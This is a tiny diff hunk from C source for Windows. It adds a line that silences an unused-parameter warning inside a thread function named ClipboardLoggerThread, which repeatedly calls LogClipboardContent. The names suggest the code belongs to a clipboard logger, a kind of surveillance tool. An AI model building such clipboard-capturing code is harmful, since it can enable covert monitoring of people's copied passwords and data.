@@ -60,6 +60,7 @@ void LogClipboardContent(void)
 
 DWORD WINAPI ClipboardLoggerThread(LPVOID lpParam)
 {
+    (void)lpParam;
     while (1)
     {
         LogClipboardContent();
